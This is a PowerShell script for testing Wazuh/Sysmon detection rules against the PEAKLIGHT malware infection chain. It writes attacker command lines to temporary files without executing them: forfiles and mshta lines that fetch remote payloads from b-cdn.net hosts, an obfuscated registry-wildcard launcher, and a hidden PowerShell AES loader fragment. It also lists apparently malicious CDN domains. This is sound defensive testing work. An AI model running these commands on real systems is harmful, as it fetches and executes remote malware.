# PEAKLIGHT Comprehensive Detection Test Script
# ⚠️ FOR TESTING ONLY - This simulates PEAKLIGHT malware behaviors for detection testing purposes ⚠️
# Based on Mandiant research into PEAKLIGHT infection chain

# Global variables for test files
$global:TestFolder = "$env:TEMP\PeaklightTest"
$global:RandomString = -join ((97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$global:RandomExt = -join ((97..122) | Get-Random -Count 3 | ForEach-Object {[char]$_})

function Initialize-TestEnvironment {
    # Create test directory if it doesn't exist
    if (-not (Test-Path -Path $TestFolder)) {
        New-Item -Path $TestFolder -ItemType Directory -Force | Out-Null
        Write-Host "Created test directory: $TestFolder" -ForegroundColor Gray
    }
    
    Write-Host "`n===================================================" -ForegroundColor Magenta
    Write-Host "PEAKLIGHT DETECTION TEST FRAMEWORK" -ForegroundColor Magenta
    Write-Host "===================================================" -ForegroundColor Magenta
    Write-Host "This script simulates PEAKLIGHT malware behaviors for detection testing." -ForegroundColor Yellow
    Write-Host "No actual malicious activity will be performed." -ForegroundColor Yellow
    Write-Host "Tests will create temporary files that are removed after each test." -ForegroundColor Yellow
    Write-Host "===================================================" -ForegroundColor Magenta
}

function Test-Stage1LNKBehaviors {
    Write-Host "`n[TEST GROUP 1] Stage 1: LNK Execution Patterns" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------" -ForegroundColor Cyan
    
    # Test 1.1: PSScriptPolicyTest file creation (Rule 100601)
    Write-Host "`n[Test 1.1] Creating PSScriptPolicyTest file (Rule 100601)" -ForegroundColor White
    $policyTestPath = "$env:TEMP\__PSScriptPolicyTest_$RandomString.$RandomExt.ps1"
    
    @"
# This is a test file for Wazuh rule 100601
Write-Host "Harmless test script to trigger detection"
"@ | Out-File -FilePath $policyTestPath
    
    Write-Host "Created test file: $policyTestPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100601" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Test 1.2: Simulate LNK with forfiles.exe command (Rule 100612)
    Write-Host "`n[Test 1.2] Simulating forfiles.exe command pattern (Rule 100612)" -ForegroundColor White
    $forfilesCommand = "forfiles.exe /p C:\Windows /m win.ini /c `"echo powershell . mshta https://nextomax.b-cdn.net/nexto`""
    
    Write-Host "Simulating command: $forfilesCommand" -ForegroundColor Yellow
    Write-Host "Creating command log file to be detected by Sysmon..." -ForegroundColor Gray
    
    $commandLogPath = "$TestFolder\forfiles_command.txt"
    $forfilesCommand | Out-File -FilePath $commandLogPath
    
    # We're not actually executing the command, just creating a log of it that Sysmon might detect
    Write-Host "Command log created at: $commandLogPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100612 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Test 1.3: Simulate wildcard registry access (Rule 100613)
    Write-Host "`n[Test 1.3] Simulating wildcarded registry access (Rule 100613)" -ForegroundColor White
    $wildcardCommand = "powershell .(gp -pa 'HKLM:\SOF*\Clas*\Applications\msh*e').('PSChildName')https://potexo.b-cdn.net/potexo"
    
    $commandLogPath = "$TestFolder\wildcard_command.txt"
    $wildcardCommand | Out-File -FilePath $commandLogPath
    
    Write-Host "Command log created at: $commandLogPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100613 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Clean up
    if (Test-Path -Path $policyTestPath) {
        Remove-Item -Path $policyTestPath -Force
    }
}

function Test-Stage2MSHTABehaviors {
    Write-Host "`n[TEST GROUP 2] Stage 2: MSHTA and JavaScript Behaviors" -ForegroundColor Cyan
    Write-Host "--------------------------------------------------" -ForegroundColor Cyan
    
    # Test 2.1: Simulate MSHTA CDN access (Rule 100614)
    Write-Host "`n[Test 2.1] Simulating MSHTA CDN access (Rule 100614)" -ForegroundColor White
    
    # Create a log file that contains the command - safer than actual execution
    $mshtaCommand = "mshta.exe https://nextomax.b-cdn.net/nexto"
    $commandLogPath = "$TestFolder\mshta_command.txt"
    $mshtaCommand | Out-File -FilePath $commandLogPath
    
    Write-Host "Command log created at: $commandLogPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100614 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Test 2.2: Create JavaScript dropper pattern file
    Write-Host "`n[Test 2.2] Creating JavaScript dropper pattern file" -ForegroundColor White
    $jsDropperPath = "$TestFolder\dropper_simulation.js"
    
    @"
// This is a simulation of the PEAKLIGHT JavaScript dropper pattern
function wAJ(arr) {
    var result = "";
    for(var i = 0; i < arr.length; i++) {
        result += String.fromCharCode(arr[i] - 619);
    }
    return result;
}

var KbX = [/* encoded command data would be here */];
var YmD = [/* encoded WScript.shell would be here */];

// We're not actually executing anything, just creating the pattern
console.log("PEAKLIGHT dropper pattern simulation");
"@ | Out-File -FilePath $jsDropperPath
    
    Write-Host "JavaScript dropper simulation created at: $jsDropperPath" -ForegroundColor Green
    Write-Host "This file matches patterns that might be detected by content inspection rules" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

function Test-Stage3PowerShellDownloader {
    Write-Host "`n[TEST GROUP 3] Stage 3: PowerShell Downloader Behaviors" -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor Cyan
    
    # Test 3.1: Simulate AES encrypted execution (Rule 100615)
    Write-Host "`n[Test 3.1] Simulating AES encrypted execution pattern (Rule 100615)" -ForegroundColor White
    
    $aesCommand = "powershell.exe -w 1 -ep Unrestricted -nop `$key = [System.Convert]::FromBase64String('AAAAAAAAAAAAAAAAAAAAAA=='); `$aes = New-Object System.Security.Cryptography.AesManaged"
    $commandLogPath = "$TestFolder\aes_command.txt"
    $aesCommand | Out-File -FilePath $commandLogPath
    
    Write-Host "Command log created at: $commandLogPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100615 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Test 3.2: Create ZIP files matching PEAKLIGHT patterns (Rule 100616)
    Write-Host "`n[Test 3.2] Creating ZIP files matching PEAKLIGHT patterns (Rule 100616)" -ForegroundColor White
    
    $zipFiles = @(
        [PSCustomObject]@{Name="L1.zip"; Path="$env:APPDATA\L1.zip"},
        [PSCustomObject]@{Name="L2.zip"; Path="$env:APPDATA\L2.zip"},
        [PSCustomObject]@{Name="K1.zip"; Path="$env:APPDATA\K1.zip"},
        [PSCustomObject]@{Name="K2.zip"; Path="$env:APPDATA\K2.zip"}
    )
    
    foreach ($zipFile in $zipFiles) {
        # Create empty ZIP files
        Set-Content -Path $zipFile.Path -Value "PK`5`6" -NoNewline
        Write-Host "Created empty ZIP file: $($zipFile.Path)" -ForegroundColor Green
    }
    
    Write-Host "Expected to trigger Rule ID: 100616" -ForegroundColor Yellow
    Write-Host "Waiting 5 seconds to allow detection..." -ForegroundColor Gray
    Start-Sleep -Seconds 5
    
    # Test 3.3: Simulate PowerShell ZIP handling (Rule 100620)
    Write-Host "`n[Test 3.3] Simulating PowerShell ZIP handling (Rule 100620)" -ForegroundColor White
    
    $zipCommand = "powershell.exe Add-Type -Assembly System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::OpenRead('$env:APPDATA\L1.zip')"
    $commandLogPath = "$TestFolder\zip_command.txt"
    $zipCommand | Out-File -FilePath $commandLogPath
    
    Write-Host "Command log created at: $commandLogPath" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100620 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Clean up ZIP files
    foreach ($zipFile in $zipFiles) {
        if (Test-Path -Path $zipFile.Path) {
            Remove-Item -Path $zipFile.Path -Force
            Write-Host "Removed test file: $($zipFile.Path)" -ForegroundColor Gray
        }
    }
}

function Test-Stage4Payloads {
    Write-Host "`n[TEST GROUP 4] Stage 4: Final Payload Indicators" -ForegroundColor Cyan
    Write-Host "---------------------------------------------" -ForegroundColor Cyan
    
    # Test 4.1: Create SHADOWLADDER component files (Rule 100617)
    Write-Host "`n[Test 4.1] Creating SHADOWLADDER component files (Rule 100617)" -ForegroundColor White
    
    $shadowladderFiles = @(
        [PSCustomObject]@{Name="bentonite.cfg"; Path="$TestFolder\bentonite.cfg"},
        [PSCustomObject]@{Name="cymophane.doc"; Path="$TestFolder\cymophane.doc"},
        [PSCustomObject]@{Name="toughie.txt"; Path="$TestFolder\toughie.txt"},
        [PSCustomObject]@{Name="LiteSkinUtils.dll"; Path="$TestFolder\LiteSkinUtils.dll"},
        [PSCustomObject]@{Name="WCLDll.dll"; Path="$TestFolder\WCLDll.dll"}
    )
    
    foreach ($file in $shadowladderFiles) {
        Set-Content -Path $file.Path -Value "Test file for SHADOWLADDER component detection"
        Write-Host "Created SHADOWLADDER test file: $($file.Path)" -ForegroundColor Green
    }
    
    Write-Host "Expected to trigger Rule ID: 100617" -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    
    # Test 4.2: Create CRYPTBOT/LUMMAC component files (Rule 100618)
    Write-Host "`n[Test 4.2] Creating CRYPTBOT/LUMMAC component files (Rule 100618)" -ForegroundColor White
    
    $cryptbotFiles = @(
        [PSCustomObject]@{Name="WebView2Loader.dll"; Path="$TestFolder\WebView2Loader.dll"},
        [PSCustomObject]@{Name="oqnhustu"; Path="$TestFolder\oqnhustu"},
        [PSCustomObject]@{Name="erefgojgbu"; Path="$TestFolder\erefgojgbu"}
    )
    
    foreach ($file in $cryptbotFiles) {
        Set-Content -Path $file.Path -Value "Test file for CRYPTBOT/LUMMAC component detection"
        Write-Host "Created CRYPTBOT/LUMMAC test file: $($file.Path)" -ForegroundColor Green
    }
    
    Write-Host "Expected to trigger Rule ID: 100618" -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    
    # Test 4.3: Create AutoIt3 script (Rule 100621)
    Write-Host "`n[Test 4.3] Creating AutoIt3 script file (Rule 100621)" -ForegroundColor White
    
    $au3Path = "$env:TEMP\Hofla.au3"
    Set-Content -Path $au3Path -Value "; Test AutoIt3 file for PEAKLIGHT detection"
    
    Write-Host "Created AutoIt3 test file: $au3Path" -ForegroundColor Green
    Write-Host "Expected to trigger Rule ID: 100621" -ForegroundColor Yellow
    Start-Sleep -Seconds 5
    
    # Clean up test files
    foreach ($file in $shadowladderFiles + $cryptbotFiles) {
        if (Test-Path -Path $file.Path) {
            Remove-Item -Path $file.Path -Force
        }
    }
    
    if (Test-Path -Path $au3Path) {
        Remove-Item -Path $au3Path -Force
    }
}

function Test-NetworkConnections {
    Write-Host "`n[TEST GROUP 5] Network Connection Patterns" -ForegroundColor Cyan
    Write-Host "---------------------------------" -ForegroundColor Cyan
    
    # Test 5.1: Simulate CDN connections (Rule 100619)
    Write-Host "`n[Test 5.1] Simulating CDN connection commands (Rule 100619)" -ForegroundColor White
    
    $cdnDomains = @(
        "potexo.b-cdn.net",
        "fatodex.b-cdn.net", 
        "matodown.b-cdn.net", 
        "nextomax.b-cdn.net"
    )
    
    foreach ($domain in $cdnDomains) {
        $cdnCommand = "cmd.exe /c echo Connecting to $domain"
        $commandLogPath = "$TestFolder\cdn_$($domain.Replace('.', '_')).txt"
        $cdnCommand | Out-File -FilePath $commandLogPath
        
        Write-Host "Created CDN connection simulation for: $domain" -ForegroundColor Green
    }
    
    Write-Host "Expected to trigger Rule ID: 100619 if Sysmon is monitoring file creation with command text" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

function Invoke-TestSuite {
    Initialize-TestEnvironment
    
    Write-Host "`nWhich tests would you like to run?" -ForegroundColor Cyan
    Write-Host "1. Stage 1: LNK Execution Patterns" -ForegroundColor White
    Write-Host "2. Stage 2: MSHTA and JavaScript Behaviors" -ForegroundColor White
    Write-Host "3. Stage 3: PowerShell Downloader Behaviors" -ForegroundColor White
    Write-Host "4. Stage 4: Final Payload Indicators" -ForegroundColor White
    Write-Host "5. Network Connection Patterns" -ForegroundColor White
    Write-Host "6. Run All Tests" -ForegroundColor White
    Write-Host "Enter selection (1-6): " -ForegroundColor Cyan -NoNewline
    
    $choice = Read-Host
    
    switch ($choice) {
        "1" { Test-Stage1LNKBehaviors }
        "2" { Test-Stage2MSHTABehaviors }
        "3" { Test-Stage3PowerShellDownloader }
        "4" { Test-Stage4Payloads }
        "5" { Test-NetworkConnections }
        "6" {
            Test-Stage1LNKBehaviors
            Test-Stage2MSHTABehaviors
            Test-Stage3PowerShellDownloader
            Test-Stage4Payloads
            Test-NetworkConnections
        }
        default {
            Write-Host "Invalid selection. Running all tests." -ForegroundColor Red
            Test-Stage1LNKBehaviors
            Test-Stage2MSHTABehaviors
            Test-Stage3PowerShellDownloader
            Test-Stage4Payloads
            Test-NetworkConnections
        }
    }
    
    # Clean up test directory
    if (Test-Path -Path $TestFolder) {
        Remove-Item -Path $TestFolder -Recurse -Force
        Write-Host "`nRemoved test directory: $TestFolder" -ForegroundColor Gray
    }
    
    Write-Host "`n===================================================" -ForegroundColor Magenta
    Write-Host "PEAKLIGHT DETECTION TESTING COMPLETE" -ForegroundColor Magenta
    Write-Host "===================================================" -ForegroundColor Magenta
    Write-Host "Check your Wazuh dashboard for alerts." -ForegroundColor Yellow
    Write-Host "Filter by rule.id (100601, 100612-100621)" -ForegroundColor Yellow
    Write-Host "`nIf you don't see alerts for some tests:" -ForegroundColor Yellow
    Write-Host "1. Verify Sysmon is properly configured to capture relevant events" -ForegroundColor White
    Write-Host "2. Make sure the Wazuh agent is forwarding Sysmon events" -ForegroundColor White
    Write-Host "3. Confirm the custom rules are properly loaded on the Wazuh server" -ForegroundColor White
    Write-Host "===================================================" -ForegroundColor Magenta
}

# Run the test suite
Invoke-TestSuite